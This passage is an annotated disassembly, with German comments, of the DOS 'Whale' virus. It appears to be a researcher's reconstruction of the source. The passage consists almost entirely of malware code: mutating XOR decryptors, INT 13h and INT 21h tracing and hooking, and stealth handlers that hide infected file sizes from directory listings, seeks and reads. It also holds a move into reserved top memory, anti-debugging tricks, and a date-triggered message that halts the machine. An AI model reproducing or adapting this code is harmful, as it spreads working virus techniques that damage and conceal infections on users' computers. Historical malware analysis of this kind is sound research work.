                CALL    DS:[@INT21]         ; CALL INT 21h
        ;-------( einsprung )--------------
                CALL    J042A5

J042A2:         MOV     BX,5601h
J042A5:         POP     BX              ; BX =
                SUB     BX,239Fh        ; BX =
                MOV     CX,8934h
                MOV     CX,code_len     ; CX = 2385
                PUSH    CS
                PUSH    AX
                MOV     AX,0000h
                MOV     DS,AX
                POP     AX
                POP     DS              ; DS=CS !
J042B9:         DEC     BYTE Ptr DS:[BX]
                XOR     BYTE Ptr DS:[BX],05h
                INC     BX
                LOOP    J042B9
                MOV     CX,0023h
                DEC     BYTE Ptr DS:[BX+008Eh]
                JZ      J0427E

                PUSH    ES
                MOV     CX,0000h
                POP     DS
                JMP_ENTRY 19,mut_19

                DW      0FBC3h
;=====================================================================
;=====================================================( MUTANT #2 )===
;=====================================================================
Mut_2           EQU     $
                PUSH    AX                      ; = OFFSET 4BB5
                XLAT                            ; MOV AL,[BX+AL]
J042D6:         XOR     BYTE Ptr DS:[BX],10h
                ADD     BX,+01h
                LOOP    J042D6
                POP     AX
                POP     BX
                POP     CX
                PUSH    SI
                MOV     SI,Offset @INT21
                CLC

                CALL    [SI]            ; CALL Int 21
                CLC
                POP     SI
                INC     BX
        ;-------( einsprung )--------------
                CALL    J04317

J042EE:         SUB     BX,239Fh        ; BX =
                MOV     CX,2387h
                DEC     CX
                STC
                DEC     CX              ; CX = 2385

J042F8:         XOR     BYTE Ptr DS:[BX],10h
                ADD     BX,+01h
                LOOP    J042F8
                                ; BX =
                MOV     CX,BX
                MOV     CX,008Eh
                ADD     BX,CX           ; BX =
                DEC     BYTE Ptr DS:[BX]
                JZ      J0430D
                JMP     SHORT J0430E

J0430D:         RETN

J0430E:         PUSH    ES
                MOV     AX,0000h
                POP     DS
                CLC
                JMP_ENTRY 2,mut_2
                ;----------------
J04317:         POP     BX
                PUSH    BX
                PUSH    CS
                PUSH    CX
                STC
                POP     CX
                POP     DS
                CLC
                RETN
;=====================================================================
;======================================================( MUTANT #9)===
;=====================================================================
Mut_9           EQU     $
J04320:         ADD     BYTE Ptr DS:[BX],05h    ; = OFFSET 4BB5
                ADD     BX,+01h
                LOOP    J04320
                POP     BX
                INC     CX
                POP     CX
                PUSH    SI
                MOV     SI,Offset @INT21

                CALL    [SI]               ; CALL INT 21
                CLC
                POP     SI
                INC     DX
                PUSH    AX
                POP     DX
                NOP
        ;-------( einsprung )--------------
                CALL    J0433B
J0433A:         CLC
J0433B:         POP     BX              ; BX =
                SUB     BX,239Fh        ; BX =
                MOV     CH,23h
                MOV     CL,85h          ; CX = 2385
                CALL    J04360          ; DS = CS

J04347:         SUB     BYTE Ptr DS:[BX],05h
                INC     BX
                CLC
                ADD     DX,+12h
                LOOP    J04347
                ADD     BX,008Eh        ; BX =
                DEC     BYTE Ptr DS:[BX]
                JNZ     J04364
                RETN

                INC     BX
                ADD     CX,0D7Ah
                XLAT                            ; MOV AL,[BX+AL]
J04360:         PUSH    CS
                POP     DS
                RETN

                DB      0A4H
J04364:         PUSH    ES
                POP     DS
                JMP_Entry 9,mut_9
                DB      25H
                DB      26H
                DB      85h
;=====================================================================
;========================================( Kodiert 1274h... 1B5Ch )===
;========================================(       == 3A84 .. 436Ch )===
;=====================================================================
Code_3A84:      MDECODE 68
J04371:         MOV     BX,Offset J03A84-Offset VirStart      ; 1274h
                MOV     CX,Offset Code_3A84-Offset J03A84     ; 08E8h
J04377:         IN      AL,40h
                OR      AL,00h
                JZ      J04377

J0437D:         XOR     CS:[BX],AL
                INC     BX
                LOOP    J0437D

                CALL    J04386
J04386:         POP     BX
                ADD     BX,OFFSET XORBYTE_7D - Offset J04386  ; +1E
                                            ; GEGENSTUECK IST DORT !
                MOV     CS:[BX],AL
                MCODE   68
                RETN
;=====================================================================
;======================================( Dekodiert 1274h... 1B5Ch )===
;=====================================================================
Decode_3A84:    MOV     BX,Offset J03A84-Offset VirStart      ; 1274h
                MOV     CX,Offset Code_3A84-Offset J03A84     ; 08E8h
                ;CALL    J04984         ; wie ist es mit dem RET ???
                CALL    J043A1          ; muesste CALL 43A1 heissen .

                DB      90h
                DB      70h
                db      90h
                db      91h
                db      7dh
                db      73h

J043A1:         XOR     BYTE PTR CS:[BX],00  ; <---- !

XORBYTE_7D      EQU     $-1            ; !!!!!!!!

                INC     BX
                LOOP    J043A1
                RETN
;======================================================================
                DB      02eh,0c7h,006h,099h
                DB      007h,000h,000h,0e8h
;==================================================================
;===========================================( Vorarbeiten )========
;==================================================================
J043B1:         MDECODE 69
                CALL    Trace_int_13h
                PUSH    DX
                MOV     AH,36h          ; Get free Space on Disk
                MOV     DL,CS:[D2428]   ; DL = Disk
                CALL    CS:[@INT21]
                MUL     CX
                MUL     BX              ; AX*BX*CX = Free space in Byte
                MOV     BX,DX           ; DX = Total Clusters on disk
                POP     DX
                OR      BX,BX
                MCODE   69
                JNZ     J043DA

J043D5:         CMP     AX,4000h
                JB      J0443D

J043DA:         MOV     AX,4300h               ; GET FILE-ATTRIBUT
                CALL    CS:[@INT21]
                JB      J0443D

                MDECODE 70
                MOV     CS:[D24F4],DX          ; Offset Filename
                MOV     CS:[D24F2],CX          ; File-Attribut
                MOV     CS:[D24F6],DS          ; Segment Filename

                MOV     AX,4301h               ; SET File-Attribut
                XOR     CX,CX
                CALL    CS:[@INT21]
                CMP     BYTE PTR CS:[Error],00h

                MCODE   70
                JNZ     J0443D

                MOV     AX,3D02h                ; OPEN FILE / HANDLE
                CALL    CS:[@INT21]
                JB      J0443D

                MDECODE 71
                MOV     BX,AX                   ; HANDLE NACH BX
                PUSH    BX
                MOV     AH,32h                  ; GET DISK INFO
                MOV     DL,CS:[D2428]           ; DRIVE NR.
                CALL    CS:[@INT21]
                MOV     AX,[BX+1Eh]             ; DS:BX : DISK-INFO-BLOCK
                MOV     CS:[D24EC],AX
                POP     BX
                CALL    J048CD
                MCODE   71
                RETN
                DB      0B4h
;=================================================( Fehler melden )===
J0443D:         MDECODE 72
                xor     bx,bx
                dec     bx              ; BX = 0ffffh
                call    J048CD
                MCODE   72
                ret
;=====================================================================
;================================================( INT 24-Handler )===
;=====================================================================
J0444D:         MDECODE 73
                XOR     AL,AL
                MOV     BYTE PTR CS:[Error],01h
                MCODE   73
                IRET
                DB      8Ch
;=====================================================================
;==================================( Checkt die Uhrzeit des Files )===
;=====================================================================
CheckFileTime:  MDECODE 74
                PUSH    CX
                PUSH    DX
                PUSH    AX
                MOV     AX,4400h                ; Get IOCTL-Dev.Info
                CALL    CS:[@INT21]   ; Handle in BX
                XOR     DL,80h                  ; DL and 80h = 1: Device,
                                                ; DL and 80h = 0: Diskfile
                TEST    DL,80h                  ;
                JZ      J04483                  ; es war KEIN Diskfile !

                MOV     AX,5700h                ; Get File-Timestamp
                CALL    CS:[@INT21]
                TEST    CH,80h                  ; Stunde >= 16 ?
J04483:         POP     AX
                POP     DX
                POP     CX
                MCODE   74
                RETN
                DB      0F6h
;=====================================================================
;======================( von INT 3/21h angesprungen, falls AH=40h )===
;=====================================================================
J0448C:         CMP     Word PTR CS:[D2581],4   ; FILEHANDLE
                JB      J044BA                  ; KEIN FILE !
                PUSH    CS
                POP     BX
                SUB     BH,20h                  ; 2 Segmente vor CS
                MOV     AX,CS:[D257B]           ; AX := SAVE-DS
                CMP     AX,BX                   ; Ist SAVE-DS hîher
                JB      J044BA                  ; als D257B, z.B. das
                MOV     CS:[D257B],BX           ; DS des COMMAND.COM
                JMP     SHORT J044BA
                DB      0E8h
;=====================================================================
;=================================( von INT 3=INT 21 angesprungen )===
;=====================================================================
J044A9:         SUB     BYTE PTR CS:[SwapCode_7],52h
                PUSH    CS:[D2579]      ; SAVE-AX
                POP     CX
                CMP     CH,40h          ; WRITE File
        ;=============================================================
        ;durch das obige "SUB BYTE PTR CS:[1CA8h]" wird folgender Code
        ;=============================================================
SwitchByte      EQU     $
                DB      0C6h    ; aus 0c6h wird 074h, Spiel mit Queue!
                DB      0D2H    ; es sind genau 8 Byte dazwischen.....
        ;=============================================================
        ; folgendermassen verÑndert :
        ;=============================================================
        ;        JZ      J0448C
        ;=============================================================
J044BA:
                POP     Word Ptr DS:[000Eh] ; INT 3 restaurieren
                POP     Word Ptr DS:[000Ch]
                ADD     BYTE PTR CS:[SwapCode_7],52h
                CALL    RestoreRegs
                JMP     J02AFB
;=====================================================================
;=================================================( Get File-Size )===
;=====================================================================
GetFileSize:    MDECODE 75
                CALL    SaveRegisters

                XOR     CX,CX
                MOV     AX,4201h          ; SEEK von momentaner Position
                XOR     DX,DX             ; 0 (!) byte weiter
                CALL    CS:[@INT21]
                MOV     Word ptr CS:[FilePos+2],DX
                                         ; in DX:AX ist neue/alte Position
                MOV     Word ptr CS:[FilePos  ],AX

                MOV     AX,4202h          ; SEEK zum File-Ende
                XOR     CX,CX
                XOR     DX,DX
                CALL    CS:[@INT21]

                MOV     Word ptr CS:[FileSize+2],DX   ; File-Laenge zurÅck
                MOV     Word ptr CS:[FileSize  ],AX

                MOV     AX,4200h          ; SEEK zur alten Position
                MOV     DX,Word ptr CS:[FilePos  ]
                MOV     CX,Word ptr CS:[FilePos+2]
                CALL    CS:[@INT21]

                CALL    GetRegsFromVirstack
                MCODE   75
                RETN
;=====================================================================
;======================================( INT 3 aus INT 21-Handler )===
;=====================================================================
J0451A:         POP     AX      ; POP IP
                POP     BX      ; POP CS
                POP     CX      ; POP Flags
                JMP     J044A9
;=====================================================================
;=================================( Handler fÅr Get/Set Filedatum )===
;=====================================================================
J0451F:         OR      AL,AL           ; GET File-Date ??
                JNZ     J04550          ; Nein, SET !
                ;---------------------------------( get file-date )---
                MDECODE 76
                AND     WORD PTR CS:[D24B3],0FFFEH ; clear CF
                CALL    PopALL
                CALL    CS:[@INT21]
                MCODE   76
                JB      J04547
                TEST    CH,80h          ; FILE-STUNDE > 16 ?
                JZ      J04544
                SUB     CH,80h          ; Wenn ja, 16 abziehen
J04544:         JMP     IRET_Int21h     ; INT 21 beenden
                ;------------------------------------------------------
J04547:         OR      WORD PTR CS:[D24B3],+01h; SET CF des Callers
                JMP     IRET_Int21h
                ;----------------------------------( set file-date )---
J04550:         CMP     AL,01h          ; ist es 'set file date' ?
                JNZ     J045CD          ; Fehler im Walcode!
                                        ; CALL LOW-INT-21
                MDECODE 77
                AND     WORD PTR CS:[D24B3],0FFFEH ; CF lîschen
                TEST    CH,80h          ; Stunde > 16 ?
                MCODE   77
                JZ      J0456B          ; nein
                SUB     CH,80h          ; 16 abziehen
J0456B:         CALL    CheckFileTime
                JZ      J04573          ; kein DISK-File,
                                        ; oder Stunde < 16
                ADD     CH,80h          ; sonst 16 addieren
                ;-----------------
J04573:         MDECODE 78
                CALL    CS:[@INT21]
                MOV     [BP-04h],AX             ; Errorcode
                ADC     WORD PTR CS:[D24B3],+00h; = CLC
                MCODE   78
                JMP     J02EA3                  ; fertig
;=====================================================================
;=====================================( gehîrt zum INT 21-Handler )===
;=====================================================================
J0458D:         CALL    SaveRegs
                IN      AL,21h
                OR      AL,02h
                OUT     21h,AL
                PUSH    AX
                MOV     AX,0000h
                MOV     DS,AX
                POP     AX
                PUSH    Word Ptr DS:[000Ch]     ; HOLE INT 3-Offset
                PUSH    Word Ptr DS:[000Eh]     ; HOLE INT 3-Segment
                PUSH    CS
                POP     Word Ptr DS:[000Eh]     ; Setze INT 3 auf
                                                ; CS:01D0A / CS:451A
                MOV     WORD Ptr DS:[000Ch],OFFSET J0451A-Offset VirStart
                INT     3                       ; ** tricky **
;---------------------------------------------------------------------
                DB      83h
;=====================================================================
;=====================================( Handler fÅr SEEK / Handle )===
;=====================================================================
J045B2:         MDECODE 79
J045B7:         CMP     AL,02h          ; Seek File-ENDE ??
                JNZ     J045C9          ; alles andere ist uninteressant
                CALL    CheckFileTime   ; Ja ...
                JZ      J045C9
                SUB     WORD Ptr [BP-0Ah],Code_len
                SBB     WORD Ptr [BP-08h],+00h
J045C9:         MCODE   79
J045CD:         JMP     J02B8B          ; CALL LOW-INT-21
;=====================================================================
;=====================================================( AKTIV-MSG )===
;=====================================================================
J045D0:         MDECODE 80
                CALL    PushALL
                MOV     AH,2Ah                  ; GET DATE
                CALL    CS:[@INT21]
                ;==========( Nur zwischen 18.Februar und 21. MÑrz )===
                CMP     DH,02h                  ; MONAT FEBRUAR ?
                JZ      J045EC                  ; Ja : welcher
                CMP     DH,03h                  ; MÑrz ?
                JZ      J045F4                  ; Ja   : welcher
                JMP     J04663                  ; Nein : fertig
J045EC:         CMP     DL,13h                  ; Nach dem 18. Februar ??
                JNB     J045FC                  ; JA   -> MSG
                JMP     J04663                  ; NEIN -> fertig

J045F4:         CMP     DL,15h                  ; VOR 21. MÑrz ??
                JB      J045FC                  ; JA   : MSG
                JMP     J04663                  ; NEIN : Fertig
J045FC:         JMP     J0463D
        ;========================================================
D45FF:  DB      "THE WHALE IN SEARCH OF THE 8 FISH",0ah,0dh
        DB      "I AM '~knzyvo}' IN HAMBURG$"
        ;========================================================
J0463D:         MOV     AH,09h
                PUSH    CS
                POP     DS
                MOV     DX,Offset D45FF-Offset VirStart ; 1DFF
                CALL    CS:[@INT21]
                ;==================================( schreibe HLT )===
                MOV     WORD PTR CS:[D2598],0F4F4h       ; = HLT
                MOV     BX,D2598
                PUSHF
                PUSH    CS
                PUSH    BX
                XOR     AX,AX
                MOV     DS,AX
                MOV     WORD Ptr DS:[0006h],0FFFFh
                CALL    Debugger_Check
                ;-----------------------------------------------------
J04663:         CALL    PopALL
                MCODE   80
                RETN
;=====================================================================
;=================================( Handler fÅr READ FILE /Handle )===
;=====================================================================
J0466B:         JMP     J02B8B                  ; CALL LOW-INT-21
J0466E:         AND     BYTE PTR CS:[D24B3],0FEh; CF lîschen
                CALL    CheckFileTime
                JZ      J0466B                  ; entweder kein DISK-File,
                                                ; oder 'falsche' Uhrzeit
                MDECODE 81
                MOV     CS:[D24AD],DX           ; Buffer merken
                MOV     CS:[D24AF],CX           ; Anzahl merken
                MOV     WORD PTR CS:[D24B1],0000h
                CALL    GetFileSize
                MOV     AX,Word ptr CS:[FileSize  ]
                MOV     DX,Word ptr CS:[FileSize+2]
                SUB     AX,Code_len
                SBB     DX,+00h
                SUB     AX,Word ptr CS:[FilePos  ]
                SBB     DX,Word ptr CS:[FilePos+2]
                MCODE   81
                JNS     J046B9                  ; Lang genug fÅr den Wal
                MOV     WORD Ptr [BP-04h],0000h
                JMP     J031E7                  ; fertig
;--------------------------------------------------------------------
J046B9:         MDECODE 82
                JNZ     J046C8                  ; JMP if Platz
                CMP     AX,CX                   ; Mehr als Wal-LÑnge ?
                JA      J046C8
                MOV     CS:[D24AF],AX           ; Dann eben mehr Byte lesen,
                                                ; als verlangt !
J046C8:         MOV     CX,WORD PTR CS:[FilePos+2]
                MOV     DX,WORD PTR CS:[FilePos  ]
                OR      CX,CX                   ; Bin ich im 1. Segment ?

                MCODE   82
                JNZ     J046DF                  ; nein -> JMP
                CMP     DX,+1Ch                 ; wenigstens hinter
                                                ; dem EXE-Header ?
                JBE     J04704                  ; JMP, wenn mittendrin !
;--------------------------------------------------------------------
;-----------------------------------------------( lese-Schleife )----
;--------------------------------------------------------------------
J046DF:         MDECODE 83
                MOV     DX,WORD PTR CS:[D24AD]  ; Lese in DS:DX
                MOV     AH,3Fh
                MOV     CX,WORD PTR CS:[D24AF]  ; Soviele Byte
                CALL    CS:[@INT21]
                ADD     AX,WORD PTR CS:[D24B1]  ; Gesamtzahl gelesen
                MOV     [BP-04h],AX
                MCODE   83
                JMP     J02EA3                  ; fertig
;--------------------------------------------------------------------
J04704:         MOV     DI,DX                   ; Filepos
                MOV     SI,DX
                ADD     DI,WORD PTR CS:[D24AF]  ; Anzahl zu lesender byte
                CMP     DI,+1Ch                 ; Summe < 1Ch ?
                JB      J04717                  ; JMP wenn kleiner
                XOR     DI,DI                   ; DI = 0
                JMP     SHORT J0471C
;--------------------------------------------------------------------
                DB      0F7H
;--------------------------------------------------------------------
J04717:         SUB     DI,01CH                 ; DI ist z.B. 10H.
                                                ; SUB DI,1C : DI = FFF4
                NEG     DI                      ; NEG DI    : DI = 000B
J0471C:         MDECODE 84
                MOV     AX,DX
                MOV     DX,Word ptr CS:[FileSize  ]
                MOV     CX,Word ptr CS:[FileSize+2]

                ADD     DX,+0Fh         ; Einen Paragrafen weiter
                ADC     CX,+00h

                AND     DX,0FFEFH       ; ergibt eine Rundung
                                        ; auf volle Paragrafen
                SUB     DX,23FCh        ; Wal-Size abziehen
                SBB     CX,+00h

                ADD     DX,AX
                ADC     CX,+00h

                MOV     AX,4200h         ; SEEK from Start
                CALL    CS:[@INT21]

                MOV     CX,001Ch
                SUB     CX,DI
                SUB     CX,SI

                MOV     AH,3Fh           ; READ FILE
                MOV     DX,CS:[D24AD]
                CALL    CS:[@INT21]

                ADD     CS:[D24AD],AX
                SUB     CS:[D24AF],AX
J04767:         ADD     CS:[D24B1],AX

                XOR     CX,CX
                MOV     AX,4200h                ; SEEK from Start
                MOV     DX,001Ch                ; zur Position 1Ch
                CALL    CS:[@INT21]

                MCODE   84
                JMP     J046DF                  ; zum nÑchsten TeilstÅck
;=====================================================================
;=========================( Handler fÅr FindFirst/Findnext /ASCIIZ)===
;=====================================================================
J04780:         MDECODE 85
                AND     WORD PTR CS:[D24B3],0FFFEH      ; ZF lîschen
                CALL    PopALL
                CALL    CS:[@INT21]
                CALL    PushALL
                MCODE   85
                JNB     J047A5
                OR      WORD PTR CS:[D24B3],+01h
J047A0          EQU     $-2
                JMP     J02EA3                          ; fertig
        ;--------------------------;
        ;J047A0: AND     AL,01     ;
        ;        JMP     J02EA3    ;
        ;--------------------------;

J047A5:         CALL    GetDTA
                TEST    BYTE Ptr DS:[BX+17h],80h
                JNZ     J047B7                  ; infiziert. Verschleiern !
                JMP     J02EA3                  ; Fertig
;=====================================================================
;=====================================================( Trash !!! )===
;=====================================================================
J047B1:         CLC
                INC     DX
                PUSH    DS
                POP     ES
                PUSH    DX
                JMP     J047A0        ; DB 0EBH ; sind jetzt 2 Byte zuviel
;-------------------------------------( 'echter code 'Åberlappend )---
J047B7:         MDECODE 86
                SUB     WORD Ptr DS:[BX+1Ah],Code_len
                SBB     WORD Ptr DS:[BX+1Ch],+00h
                SUB     BYTE Ptr DS:[BX+17h],80h
                MCODE   86
                JMP     J02EA3                  ; fertig
;=====================================================================
;================================( Kopiert Wal in oberen Speicher )===
;=====================================================================
Wal_Ins_MEMTOP_Kopieren:
                MDECODE 87
                CALL    J03350                  ; selbsttest !
                PUSH    CS      ; ursprÅnglich "PUSH    DS",
                                ; geht aber nicht
                XOR     AX,AX
                MOV     DS,AX
                ;-----------------------------------------------------
                ;       INT 3 wird auf 'IRET' im IBMBIO.COM gesetzt !
                ;-----------------------------------------------------
                MOV     WORD PTR DS:[000Eh],0070h
                MOV     WORD PTR DS:[000Ch],0756h ; an Adresse 70h:756h
                POP     DS
                MOV     ES,[PSP_SEG]
                PUSH    ES
                POP     DS
                SUB     WORD Ptr DS:[0002h],0270h; MEM-TOP neu festlegen
                MOV     DX,DS                   ; 2700h Byte 'reservieren'
                DEC     DX                      ; SIEHE ZEICHNUNG GANZ OBEN !
                MOV     DS,DX                   ; DS:0 zeigt auf MCB
                MOV     AX,WORD PTR DS:[0003h]  ; Hole Size des aktuellen MCB
                SUB     AX,0270h                ; und ziehe 2700h Byte AB
                ADD     DX,AX                   ; DX ist jetzt "MEM-TOP"
                MOV     WORD PTR DS:[0003h],AX  ; MCB Ñndern
                POP     DI                      ; DI = 2947h
                INC     DX                      ; 16 Byte hîher
                MOV     ES,DX                   ; ES ist ZielSegment
                PUSH    CS
                POP     DS
                MOV     SI,26FEh                ; SI = 26FE
                MOV     CX,1380h                ; CX = 1380h (words)
                                                ;    = 2760h (byte)
                                                ;    = bis Stackende  !
                MOV     DI,SI                   ; DI = SI
                STD
                XOR     BX,BX                   ; BX = 0
                MCODE   87

                REPZ    MOVSW                   ; fort ist er !
                CLD                             ; erst jetzt ?!?
                PUSH    ES                      ; Oberes Segment
                MOV     AX,SchwimmZiel          ;
                PUSH    AX                      ; ZIEL IST      ES:01B1h
                MOV     ES,CS:[PSP_SEG]         ; entsprechend  CS:29C1h
                MOV     CX,WischeWeg            ; CX = 236C
                JMP     Schwimme_Fort           ; BX = 0
;=====================================================================
;=================================================( TRACE INT 13h )===
;=====================================================================
Trace_int_13h:  MDECODE 88

                MOV     BYTE PTR CS:[Error],00h
                CALL    SaveRegisters
                PUSH    CS
 
                MOV     AL,13h
                POP     DS
                CALL    GetInt_AL

                MOV     WORD PTR DS:[Trace_Adres+2],ES
                MOV     WORD PTR DS:[Trace_Adres  ],BX

                MOV     WORD PTR DS:[@Int_13h+2],ES
                MOV     DL,02h
                MOV     WORD PTR DS:[@Int_13h  ],BX
                MOV     BYTE PTR DS:[D2450     ],DL ; DL=2, 2 Åbergehen
                CALL    SetInt_01

                MOV     WORD PTR DS:[D24DF  ],SP
                MOV     WORD PTR DS:[D24DD  ],SS

                PUSH    CS
                MOV     AX,Offset J0488D-Offset VirStart
                PUSH    AX              ; RETURNADRESSE fÅr RETF ist
                                        ; CS:J0207F, also CS:488D
                MOV     AX,0070h
                MOV     CX,0FFFFh       ; Bis zum letzten Byte suchen ...
                MOV     ES,AX
                XOR     DI,DI
                MOV     AL,0CBh         ; SCANNT IBMBIO nach 0CBh !!!
                REPNZ   SCASB           ; Also RETF

                DEC     DI

                PUSHF
                PUSH    ES
                PUSH    DI      ; RETURNADRESSE ist "RETF" in IBMBIO.COM

                PUSHF
                POP     AX
                OR      AH,01h  ; Set TF
                PUSH    AX
 
                MCODE   88
                POPF
                XOR     AX,AX                       ; Reset Disk :-)
                JMP     DWORD PTR DS:[Trace_Adres]  ; Return ist J0488D
                                                    ; JMP INT 13H
                DB      0E9h
;=====================================================================
;==========================================( RÅckkehr aus INT 13h )===
;=====================================================================
J0488D:         MDECODE 89
                PUSH    CS
                POP     DS
                PUSH    DS
                MOV     AL,13h
                LDS     DX,DWORD PTR CS:[Trace_Adres]
                CALL    SetInt_AL                  ; RE-SET INT 13
                POP     DS
 
                MOV     AL,24h
                CALL    GetInt_AL                  ; GET INT 24

                MOV     WORD PTR DS:[D243D],BX
                MOV     DX,OFFSET J0444D-Offset VirStart
                MOV     AL,24h
                MOV     WORD PTR DS:[D243D+2],ES
                CALL    SetInt_AL                  ; SET INT 24
                CALL    GetRegsFromVirstack
                PUSH    DS
                PUSH    AX
                MOV     AX,0000h
                MOV     DS,AX
                POP     AX
                MOV     WORD Ptr DS:[0006h],0070h ; Segment INT 01
                                                  ; auf 70h setzen
                POP     DS
                MCODE   89
                RETN
                DB      0F6h
;=====================================================================
;===========================================( Reset INT 13+INT 24 )===
;=====================================================================
J048CD:         MDECODE 90
                CALL    SaveRegisters
                LDS     DX,CS:[@Int_13h]       ; Alte Adresse INT 13
                MOV     AL,13h
                CALL    SetInt_AL              ; SET INT 13
                LDS     DX,DWORD PTR CS:[D243D]; Alte Adresse INT 24
                MOV     AL,24h
                CALL    SetInt_AL              ; SET INT 24
                CALL    GetRegsFromVirstack
                MCODE   90
                RET
;=========================================================( trash )===
                PUSH    CS
                POP     AX
;=====================================================================
;=================================================( TRACE INT 21H )===
;=====================================================================
J048F3:         MDECODE 91
                ;----------------------( die Zahl 0401 bedeutet : )---
                ;----------------------( 4 Ebenen, 1. Åbergehen   )---

                MOV     WORD PTR CS:[D2450],0401h
                CALL    SetInt_01
                CALL    PopALL
                PUSH    AX
                MOV     AX,CS:[D24B3]
                OR      AX,0100h                   ; Set TF
                PUSH    AX
                MCODE   91
                ;---------------------------------------------
                POPF
                POP     AX
                POP     BP
                JMP     CS:[Low_INT_21H]              ; JMP INT 21h
                ;---------------------------------------------
;=====================================================================
J0491A:         DB      00h    ; alias "210A" ! ; Klein, aber fein :-)
;=====================================================================
;==========================(         DIE DECODE-ROUTINE           )===
;==========================( Dekodiert jedes Wal-HÑhrchen separat )===
;=====================================================================
J0491B:         PUSHF
                POP     CS:[D258E]
                MOV     CS:[D2560],AX
                MOV     CS:[D2562],BX
                MOV     CS:[D2564],CX

J0492F:         DB      26h,3bh,0,72h,2,0c3h,2,53h,89h,0c1h
                DB      032h,0edh,026h,03ah,8,073h,047h,0f8h

COMMENT #       ERGIBT ;
                ;-------------------------------------------
                POP     BX              ; POP RETURNADRESSE
                MOV     AX,CS:[BX]      ; GET WORD
                ADD     BX,+02h         ; INC Returnadresse,2
                PUSH    BX              ; auf den Stack damit
                ;-----------------------; AL ist ZÑhler
                MOV     CX,AX           ; AH ist XOR-byte
                XOR     CH,CH
J00120:         XOR     CS:[BX],AH
                INC     BX
                LOOP    J00120
                ;-------------------------------------------
 #
J04941:         MOV     AX,CS:[D2560]
                MOV     BX,CS:[D2562]
                MOV     CX,CS:[D2564]
                PUSH    CS:[D258E]
                POPF
                RETN
;=====================================================================
;=====================================( kodiert das separate Teil )===
;=====================================================================
VersteckeCodeWieder:
                MOV     BP,AX
J04958:         IN      AL,40h          ; Hole Zufallszahl <> 0
                OR      AL,AL
                JZ      J04958
                POP     BX              ; Hole Adresse des Aufrufers
                PUSH    BX
                MOV     CX,Offset J02ACC-Offset J02AA8
                SUB     BX,CX           ; 24h Byte zurÅckgehen
J04965:         XOR     CS:[BX],AL
                INC     BX
                LOOP    J04965
                CALL    J0496E
J0496E:         POP     BX
                ADD     BX,Offset SpielByte-Offset J0496E
                                        ; Adresse "Spielbyte" holen
                MOV     CS:[BX],AL      ; und den Dekodierer impfen
                MOV     AX,BP
                RETN
;=====================================================================
;=======================================( dekodiert den Relokator )===
;=====================================================================
DecodeFollowingCode:
                MOV     BP,AX           ; AX sichern
                POP     BX
                PUSH    BX
                MOV     CX,Offset J02ACC-Offset J02AA8
J0497F:         XOR     BYTE PTR CS:[BX],0      ; <== "Spielbyte"
Spielbyte       EQU     $-1
                INC     BX
J04984:         LOOP    J0497F
                MOV     AX,BP
J04987  EQU     $-1                     ; CALL NIRWANA ! siehe unten !
                RETN                    ; AX zurueck
;=====================================================================
;========================================( Kodiert jede 'schuppe' )===
;=====================================================================
CodeIT:         PUSHF
                POP     CS:[D258E]
                MOV     CS:[D2560],AX
                MOV     CS:[D2562],BX
                MOV     CS:[D2564],CX
        ;-------------------------------------( aus )-----------------
J0499D:         DB      26h,3Bh,8Ah,0Fh,32h,72h,0E3H
        ;-------------------------------------( wird )----------------
        ;J0499D:        POP     BX                   ; POP returnadresse
        ;               MOV     CL,Byte Ptr CS:[BX]  ; Get Byte in CL
        ;               XOR     CH,CH
        ;               INC     BX                   ; Return eins weiter
        ;-------------------------------------------------------------
                PUSH    BX
                MOV     AX,0001h
                ADD     AX,CX                   ; AX ist Byte + 1
                SUB     BX,AX                   ; BX ist Returnadresse-AX
        ;-------------------------------------( aus )-----------------
                DB      043h,040h,00ah,0c0h,074h,0fah
        ;-------------------------------------( wird )----------------
        ;J049AC:        IN      AL,40h
        ;               OR      AL,AL
        ;               JZ      J049AC  ; hole Zufallszahl <> 0
        ;-------------------------------------------------------------
                MOV     CX,CS:[BX]
                XOR     CH,CH
                INC     BX
        ;-------------------------------------( aus )-----------------
                DB      003h,00fh,02eh,03bh,007h,072h,0c7h,0f8h
        ;-------------------------------------( wird )----------------
        ;               MOV     CS:[BX],AL
        ;J001A0:        INC     BX
        ;               XOR     CS:[BX],AL
        ;               LOOP    J001A0
        ;-------------------------------------------------------------
J049C0:         CLI
                MOV     AX,CS:[D2560]
                MOV     BX,CS:[D2562]
                MOV     CX,CS:[D2564]
                PUSH    CS:[D258E]
                POPF
                RETN
;=====================================================================
;====================================================( Der Tracer )===
;=====================================================================
Int_01_Entry:   PUSH    BP
                MOV     BP,SP
                PUSH    AX
                CMP     WORD Ptr [BP+04h],0C000h  ; Callers Segment
                JNB     J049ED                    ; hîher als C000h
                MOV     AX,CS:[D2447]             ; oder tiefer
                CMP     [BP+04h],AX               ; als D2447
                JBE     J049ED
J049EA:         POP     AX
                POP     BP
                IRET
;=====================================================================
J049ED:         CMP     BYTE PTR CS:[D2450],01h        ; Erster
                JZ      J04A1B

                MOV     AX,[BP+04h]                    ; Callers CS
                MOV     WORD PTR CS:[Trace_Adres+2],AX
                MOV     AX,[BP+02h]                    ; Callers IP
                MOV     WORD PTR CS:[Trace_Adres  ],AX
                JB      StopTrace                      ; [D2450] < 1 ?
                POP     AX
                POP     BP
                MOV     SP,CS:[D24DF]
                MOV     SS,CS:[D24DD]
                JMP     J0488D                  ; -> RET hier irgendwo
;==========================================( Trace-Mode abschalten)===
StopTrace:      AND     WORD Ptr [BP+06h],0FEFFh
                JMP     J049EA
;=====================================================================
J04A1B:         DEC     BYTE PTR CS:[D2450+1]         ; Dec (Versuche)
                JNZ     J049EA                        ; <> 0 -> weiter
                AND     WORD Ptr [BP+06h],0FEFFh      ; sonst tracen
                CALL    SaveRegisters                 ; stoppen und :
;=====================================================================
;=======================( AUS : )=====================================
;=====================================================================
J04A2A:         DB      0fch,01eh,0e2h,0e4h,040h
;=====================================================================
;========================( WIRD, Åber PATCH )=========================
;=====================================================================
                ;CALL    J02CDA
                ;IN      AL,40h
;=====================================================================
;===============================================( XOR-Byte Ñndern )===
;=====================================================================
                MOV     CS:[XorByte__1],AL           ; D_4A5E
                MOV     CS:[XorByte__2],AL           ; D_4A79
;=====================================================================
;=====================================( INT 01 auf INT 03 stellen )===
;=====================================================================
J04A39:         MOV     AL,03h
                CALL    GetInt_AL       ; GET INT 3

                PUSH    ES
                POP     DS
                MOV     DX,BX           ; DS:DX auf INT 3 stellen
                MOV     AL,01h
;=================================================================
;======( AUS : )==================================================
;=================================================================
J04A42:         DB      0e8h,027h
J04A44:         DB      01h             ; CALL    J04B6C
                DB      0EAh,072h,0e1h  ; JB      J04A29
